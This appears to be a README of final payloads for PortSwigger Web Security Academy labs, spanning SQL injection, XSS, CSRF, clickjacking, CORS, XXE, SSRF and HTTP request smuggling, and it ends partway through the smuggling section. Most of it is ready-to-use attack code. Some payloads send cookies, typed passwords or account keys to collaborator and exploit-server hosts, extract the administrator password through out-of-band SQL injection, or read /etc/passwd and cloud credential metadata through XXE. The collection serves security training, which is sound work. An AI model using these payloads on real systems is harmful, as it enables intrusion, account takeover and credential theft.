
# Portswigger Labs Writeups

All Apprentice and Practitioner-level [Portswigger labs](https://portswigger.net/web-security/all-labs), each detailed writeup is in the Markdown files.

In this README.md file you can find the final payloads for each section, and a final section regarding the vulnerability type for each step of the exam:

- [01 - SQL Injection](#1) (S2, S3)
- [02 - Cross-Site Scripting](#2) (S1, S2)
- [03 - Cross-site request forgery (CSRF)](#3) (S1, S2)
- [04 - Clickjacking](#4) (S1, S2)
- [05 - DOM-based vulnerabilities](#5) (S1, S2)
- [06 - Cross-origin resource sharing (CORS)](#6) (S1, S2)
- [07 - XML external entity (XXE) injection](#7) (S3)
- [08 - Server-side request forgery (SSRF)](#8) (S3)
- [09 - HTTP request smuggling](#9) (S1, S2)
- [10 - OS command injection](#10) (S3)
- [11 - Server-side template injection (SSTI)](#11) (S3)
- [12 - Directory traversal](#12) (S3)
- [13 - Access control vulnerabilities](#13) (S1, S2)
- [14 - Authentication](#14) (S1, S2)
- [15 - WebSockets](#15) 
- [16 - Web cache poisoning](#16) (S1, S2)
- [17 - Insecure deserialization](#17) (S3)
- [18 - Information disclosure](#18)
- [19 - Business logic vulnerabilities](#19)
- [20 - HTTP Host header attacks](#20) (S1, S2)
- [21 - OAuth authentication](#21) (S1, S2)
- [22 - File upload vulnerabilities](#22) (S3)
- [23 - JWT](#23) (S1, S2)
- [24 - Essential skills](#24)
- [25 - Prototype pollution](#25)
- [Exam steps](#26)

------------------------------------------------------

## <a name="1"></a>01 - SQL Injection

#### SQLI.01 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
/filter?category=Gifts'+OR+1=1--
```


#### SQLI.02 - SQL injection vulnerability allowing login bypass

```
password='+or'1'='1
```


#### SQLI.03 - SQL injection UNION attack, determining the number of columns returned by the query

```
/filter?category=Accessories'+union+select+NULL,NULL,NULL--
```


#### SQLI.04 - SQL injection UNION attack, finding a column containing text

```
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
```


#### SQLI.05 - SQL injection UNION attack, retrieving data from other tables

```
/filter?category=Gifts'+union+all+select+username,password+from+users--
```


#### SQLI.06 - SQL injection UNION attack, retrieving multiple values in a single column

```
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```


#### SQLI.07 - SQL injection attack, querying the database type and version on Oracle

```
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 
```


#### SQLI.08 - SQL injection attack, querying the database type and version on MySQL and Microsoft

```
/filter?category=Accessories'+union+select+0,@@version;#
```


#### SQLI.09 - SQL injection attack, listing the database contents on non-Oracle databases

```
/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
```


#### SQLI.10 - SQL injection attack, listing the database contents on Oracle

```
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```


#### SQLI.11 - Blind SQL injection with conditional responses

```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
...
```


#### SQLI.12 - Blind SQL injection with conditional errors

```
COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```


#### SQLI.13 - Blind SQL injection with time delays

```
COOKIE'||pg_sleep(10)--
```


#### SQLI.14 - Blind SQL injection with time delays and information retrieval

```
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```


#### SQLI.15 - Blind SQL injection with out-of-band interaction

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```


#### SQLI.16 - Blind SQL injection with out-of-band data exfiltration

```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```


#### SQLI.17 - SQL injection with filter bypass via XML encoding.md


```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>
    (&#x53;ELECT 1)
  </productId>
  <storeId>
    (&#x53;ELECT 1)
  </storeId>
</stockCheck>
```

```
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END


&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```


## <a name="2"></a>02 - Cross-Site Scripting

#### XSS.01 - Reflected XSS into HTML context with nothing encoded

```
<script>alert(1)</script>
```


#### XSS.02 - Stored XSS into HTML context with nothing encoded

In "Comment" field:

```
<script>alert(1)</script>
```


#### XSS.03 - DOM XSS in document.write sink using source location.search

Search:

```
"><script>alert(1)</script>
```


#### XSS.04 - DOM XSS in innerHTML sink using source location.search

Search:

```
<img src=x onerror=alert(1) />
```


#### XSS.05 - DOM XSS in jQuery anchor href attribute sink using location.search source

```
/feedback?returnPath=javascript:alert(document.cookie)
```


#### XSS.06 - DOM XSS in jQuery selector sink using a hashchange event

```
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
```


#### XSS.07 - Reflected XSS into attribute with angle brackets HTML-encoded

Search:

```
" autofocus onfocus=alert(1) x="
```


#### XSS.08 - Stored XSS into anchor href attribute with double quotes HTML-encoded

"Website" field:

```
javascript:alert(1)
```


#### XSS.09 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

Search:

```
';alert(1)//
```


#### XSS.10 - DOM XSS in document.write sink using source location.search inside a select element

```
/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
```


#### XSS.11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```
{{constructor.constructor('alert(1)')()}}

{{$on.constructor('alert(1)')()}}
```


#### XSS.12 - Reflected DOM XSS

```
\"-alert(1)}//
```


#### XSS.13 - Stored DOM XSS

"Comment" field:

```
</p><img src=x onerror=alert(1) /><p>
```


#### XSS.14 - Exploiting cross-site scripting to steal cookies

```
</p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
```


#### XSS.15 - Exploiting cross-site scripting to capture passwords

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


#### XSS.16 - Exploiting XSS to perform CSRF

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
  var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  console.log(csrf_token);
  var xhr = new XMLHttpRequest();
  xhr.open("POST", '/my-account/change-email', true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = () => { 
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    }
  }
  xhr.send("email=test12@test.com&csrf="+csrf_token);
};
</script>
```


#### XSS.17 - Reflected XSS into HTML context with most tags and attributes blocked

```
<body onresize="print()">

<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
```


#### XSS.18 - Reflected XSS into HTML context with all tags blocked except custom ones

```
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>

<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```


#### XSS.19 - Reflected XSS with some SVG markup allowed

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```


#### XSS.20 - Reflected XSS in canonical link tag

```
/post?postId=1&a=b'accesskey='X'onclick='alert(1)
```


#### XSS.21 - Reflected XSS into a JavaScript string with single quote

```
';</script><img src=x onerror=alert(1)><script>var a='a
```


#### XSS.22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

```
\';alert(1);//
```


#### XSS.23 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

```
POST /post/comment HTTP/2
...

csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//
```


#### XSS.24 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks

```
${alert(1)}
```



## <a name="3"></a>03 - Cross-site request forgery (CSRF)

#### CSRF.01 - CSRF vulnerability with no defenses

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac5004c04ed095e819302fc004d00f6.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


#### CSRF.02 - CSRF where token validation depends on request method

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```


#### CSRF.03 - CSRF where token validation depends on token being present

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a27008804d6685d8057df8500ab003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


#### CSRF.04 - CSRF where token is not tied to user session

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8d002b036bf12e80d4301200d80079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test9&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="FbQyYrVpBEJETLtQVqXtlLRi69gJg3WR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


#### CSRF.05 - CSRF where token is tied to non-session cookie

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3a0029035a2e108071588100890067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="l0RRXoovjgxMasM34eeADEMkc24whrt3" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3a0029035a2e108071588100890067.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=tCFA5gCGZOqAwxhYizupPrZqP7jvVE8L%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```


#### CSRF.06 - CSRF where token is duplicated in cookie

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
      <form action="https://0a3400fa040b0564802fee0a002000c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="TESTING123" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3400fa040b0564802fee0a002000c9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=TESTING123%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```


#### CSRF.07 - SameSite Lax bypass via method override

```
<script>
    document.location = 'https://0a6d00f7038377ec8069495800fd0010.web-security-academy.net/my-account/change-email?email=test4%40test.com&_method=POST';
</script>
```


#### CSRF.08 - SameSite Strict bypass via client-side redirect

```
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```


#### CSRF.09 - SameSite Strict bypass via sibling domain

URL-encode the “Cross-site WebSocket hijacking” payload:

```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aa";
</script>
```


#### CSRF.10 - SameSite Lax bypass via cookie refresh

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a72005004831ac38087729700fb0018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test77&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      window.onclick = () => {
          window.open('https://0a72005004831ac38087729700fb0018.web-security-academy.net/social-login');
            setTimeout(submit, 10000);
      function submit(){      
        history.pushState('', '', '/');
          document.forms[0].submit();     
          }
      }      
    </script>
  </body>
</html>
```


#### CSRF.11 - CSRF where Referer validation depends on header being present

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <meta name="referrer" content="never">
      <input type="hidden" name="email" value="test777&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


#### CSRF.12 - CSRF with broken Referer validation

```
Referrer-Policy: unsafe-url
```

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test3&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a2c007d0457217b8686cbaf0006004c.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


## <a name="4"></a>04 - Clickjacking

#### CJACK.01 - Basic clickjacking with CSRF token protection

```
<head>
  <style>
    #target_website {
      position:relative;
      width:600px;
      height:600px;
      opacity:0.1;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:600px;
      height:600px;
      z-index:1;
      }
    #btn {
      position:absolute;
      top:480px;
      left:90px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
  <button id="btn">click</button>
  </div>
  <iframe id="target_website" src="https://0a19006b043fc0ca803c0dd100220095.web-security-academy.net/my-account">
  </iframe>
</body>
```


#### CJACK.02 - Clickjacking with form input data prefilled from a URL parameter

```
<head>
  <style>
    #target_website {
      position:relative;
      width:600px;
      height:600px;
      opacity:0.1;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:600px;
      height:600px;
      z-index:1;
      }
    #btn {
      position:absolute;
      top:440px;
      left:70px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
  <button id="btn">Click me</button>
  </div>
  <iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com">
  </iframe>
</body>
```


#### CJACK.03 - Clickjacking with a frame buster script

```
<head>
  <style>
    #target_website {
      position:relative;
      width:600px;
      height:600px;
      opacity:0.1;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:600px;
      height:600px;
      z-index:1;
      }
    #btn {
      position:absolute;
      top:440px;
      left:70px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
  <button id="btn">Click me</button>
  </div>
  <iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com" sandbox="allow-forms">
  </iframe>
</body>
```


#### CJACK.04 - Exploiting clickjacking vulnerability to trigger DOM-based XSS

```
<head>
  <style>
    #target_website {
      position:relative;
      width:600px;
      height:600px;
      opacity:0.1;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:600px;
      height:600px;
      z-index:1;
      }
    #btn {
      position:absolute;
      top:440px;
      left:70px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
  <button id="btn">Click me</button>
  </div>
  <iframe id="target_website" src="https://0a9500e703977b7c812c80ce00300073.web-security-academy.net/feedback?name=%3C/span%3E%3Cimg%20src=x%20onerror=print()%3E%3Cspan%3E&email=a@a.com&subject=a&message=a">
  </iframe>
</body>
```


#### CJACK.05 - Multistep clickjacking

```
<head>
    <style>
        #target_website {
            position:relative;
            //width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:495px;
            left:55px;
        }
       #button2 {
            position:absolute;
            top:290px;
            left:200px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```


## <a name="5"></a>05 - DOM-based vulnerabilities

#### DOM.01 - DOM XSS using web messages

```
<iframe src="https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" style="width:100%;height:100%">
```


#### DOM.02 - DOM XSS using web messages and a JavaScript URL

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print`https://as.com`','*')" style="width:100%;height:100%">
```


#### DOM.03 - DOM XSS using web messages and JSON.parse

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")' style="width:100%;height:100%">
```


#### DOM.04 - DOM-based open redirection

```
/post?postId=1&url=https://exploit-0acb008f03d717b7811033f6019200df.exploit-server.net/
```


#### DOM.05 - DOM-based cookie manipulation

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```




## <a name="6"></a>06 - Cross-origin resource sharing (CORS)

#### CORS.01 - CORS vulnerability with basic origin reflection

```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net");
      req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
    
    req.withCredentials = true;

        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```


#### CORS.02 - CORS vulnerability with trusted null origin

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a9e008604151c3181d9023f008a00cf.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a8d00d304c31c4a8174019d019500e6.exploit-server.net//log?key='+this.responseText;
};
</script>"></iframe>
```


#### CORS.03 - CORS vulnerability with trusted insecure protocols

```
<html>
<script>
var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net\");req.onload = retrieveKeys;req.open('GET', url %2B \"/accountDetails\",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};" ;
</script>

<body onload="window.open('http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>'+payload+'</script>&storeId=1')">
</html>
```



## <a name="7"></a>07 - XML external entity (XXE) injection

#### XXE.01 - Exploiting XXE using external entities to retrieve files

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.02 - Exploiting XXE to perform SSRF attacks

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.03 - Blind XXE with out-of-band interaction

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://3vzysj2gzhhn64eedhoks71zjqphd71w.oastify.com"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.04 - Blind XXE with out-of-band interaction via XML parameter entities

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.05 - Exploiting blind XXE to exfiltrate data using a malicious external DTD

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.06 - Exploiting blind XXE to retrieve data via error messages

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a89003a032db21e8245e131014c005d.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```


#### XXE.07 - Exploiting XInclude to retrieve files

```
POST /product/stock HTTP/2
...

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```


#### XXE.08 - Exploiting XXE via image file upload

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```



## <a name="8"></a>08 - Server-side request forgery (SSRF)

#### SSRF.01 - Basic SSRF against the local server

```
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin/delete?username=carlos
```


#### SSRF.02 - Basic SSRF against another back-end system

```
POST /product/stock HTTP/2
...
stockApi=http%3A%2F%2F192.168.0.169%3A8080%2Fadmin/delete?username=carlos
```


#### SSRF.03 - SSRF with blacklist-based input filter

```
POST /product/stock HTTP/2
...

stockApi=http://127.1/ADMIN/delete?username=carlos
```


#### SSRF.04 - SSRF with filter bypass via open redirection vulnerability

```
POST /product/stock HTTP/2
...

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```


#### SSRF.05 - Blind SSRF with out-of-band detection

```
GET /product?productId=1 HTTP/2
...
Referer: http://snjtorvmsesj9itkltcgrqtsfjla92xr.oastify.com
...
```



## <a name="9"></a>09 - HTTP request smuggling

#### HSMU.01 - HTTP request smuggling, basic CL.TE vulnerability

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Transfer-Encoding: chunked
Connection: close

3
x=y
0

G
```


#### HSMU.02 - HTTP request smuggling, basic TE.CL vulnerability

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

26
GPOST / HTTP/1.1
Content-Length: 10

0


```


#### HSMU.03 - HTTP request smuggling, obfuscating the TE header

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

26
GPOST / HTTP/1.1
Content-Length: 10

0


```


#### HSMU.04 - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```


#### HSMU.05 - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

58
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

0


```


#### HSMU.06 - Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/delete?username=carlos HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost
Content-Length: 3

a
```


#### HSMU.07 - Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

51
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 10

0


```


#### HSMU.08 - Exploiting HTTP request smuggling to reveal front-end request rewriting

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
X-XfXVAo-Ip: 127.0.0.1

a
```


#### HSMU.09 - Exploiting HTTP request smuggling to capture other users' requests

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 928
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0aa10022031f57b8839bf075004000fc.web-security-academy.net
Cookie: session=ttGG2cUnVqyKIgqM36GrG5iprUDMiqhi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://0aa10022031f57b8839bf075004000fc.web-security-academy.net
Referer: https://0aa10022031f57b8839bf075004000fc.web-security-academy.net/post?postId=10
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 930

csrf=QZmH5dI3PgwPOQ8uw6OD1YHk0xhjvvgB&postId=10&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com&comment=
```

```
GET /my-account HTTP/2
